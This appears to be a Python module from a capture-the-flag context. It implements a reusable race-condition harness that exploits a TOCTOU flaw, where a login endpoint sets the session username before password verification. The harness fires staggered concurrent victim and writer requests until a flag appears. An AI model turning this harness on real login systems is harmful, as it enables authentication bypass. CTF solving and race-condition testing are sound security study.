"""竞态编排器。

来源：一次 TOCTOU 题（登录接口先写 session['username'] 再做 pbkdf2 校验，
管理页在校验后再读一次 session）—— 单发请求成功率 <1%，
改成"多路并发 + 起始时间抖动"后几十轮内命中。

通用模型：
    窗口 = [读1, 读2]，我们要让"写"落在中间
    -> 同时发 N 个受害者请求 + N 个写入请求，起始时间在 [0, max_delay] 内错开

注意：
  * 每次尝试必须重建前置状态（本例是重新登录拿合法 session），否则第一次写就把状态毒化
  * 多 worker 场景下还要考虑亲和性（同一会话只有 1/N 的请求会被正确 worker 处理）
"""
from __future__ import annotations

import threading
import time


def stagger(n, max_delay):
    """把 n 个并发任务在 [0, max_delay] 秒内均匀错开。"""
    step = max_delay / max(n - 1, 1)
    return [i * step for i in range(n)]


def race(rounds, prepare, victim, writer, n_victim=12, n_writer=6, max_delay=0.05,
         match=None, log=print):
    """通用竞态主循环。

    prepare()        -> ctx   每轮重建状态（如重新登录，返回 session id）
    victim(ctx)      -> str   受害者请求，返回响应文本
    writer(ctx)      -> None  写入请求（翻转状态）
    match(text)      -> str|None  从响应里判断是否命中（默认找 flag）
    返回 (flag, rounds_used)
    """
    hit_re = None
    if match is None:
        import re
        hit_re = re.compile(r"flag\{[^}\s]{1,200}\}")
        match = lambda t: (hit_re.search(t).group(0) if t and hit_re.search(t) else None)

    for r in range(1, rounds + 1):
        ctx = prepare()
        if ctx is None:
            continue

        results = []
        lock = threading.Lock()

        def do_victim(delay):
            time.sleep(delay)
            try:
                txt = victim(ctx)
            except Exception:
                return
            f = match(txt)
            if f:
                with lock:
                    results.append(f)

        def do_writer(delay):
            time.sleep(delay)
            try:
                writer(ctx)
            except Exception:
                pass

        threads = []
        for d in stagger(n_victim, max_delay):
            threads.append(threading.Thread(target=do_victim, args=(d,)))
        for d in stagger(n_writer, max_delay):
            threads.append(threading.Thread(target=do_writer, args=(d,)))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if results:
            log(f"[race] hit in round {r}")
            return results[0], r
        if r % 10 == 0:
            log(f"[race] {r}/{rounds} rounds, no hit")
    return None, rounds
